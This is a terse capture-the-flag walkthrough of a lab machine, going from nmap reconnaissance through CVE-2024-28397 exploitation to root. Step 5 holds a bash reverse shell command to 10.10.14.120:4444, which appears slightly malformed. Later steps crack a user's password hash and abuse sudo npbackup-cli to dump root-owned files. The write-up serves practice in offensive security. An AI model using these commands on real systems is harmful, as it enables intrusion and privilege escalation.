1. we start with nmap scan with ip 10.10.11.82 (nmap.png) then we add it to etc hosts and go to web page
2. for safety we also run a dirsearch (dirsearch.nmap) and a nuclei (nuclei.png)
3. we can see that we can download  the source code, we do that and we see the app tree( app_tree.png)
4. we search online and see cve-2024-28397 cve.png and we test it and is running cve_is_ok.png
5. we modify the command with “bash -c ‘bash -i >& /dev/tcp/10.10.14.120/4444 )>&1’” run the exploit and we get rev shell (exploit.png)
6. we remember where the users.db was located we open it and see the hash from marco (marco_hash.png)
7. we crack the hash and get password (marco_pass.txt)
8. we ssh with marco password and get user flag (user_flag.png)
9. we use sudo -l and see we can run npbackup-cli we need config  file but there is already one present we create a copy and modify it (gnu_root.png)
10. we run sudo /usr/local/bin/npbackup-cli -c ./test.conf -b to create a backup then  sudo /usr/local/bin/npbackup-cli -c ./test.conf --snapshots to find the snapshot we need and then sudo /usr/local/bin/npbackup-cli -c ./test.conf --snapshot-id 0a53460f --ls to list all the files (snapshot.png) and with sudo /usr/local/bin/npbackup-cli -c ./test.conf --snapshot-id 0a53460f --dump /root/root.txt we get the root flag
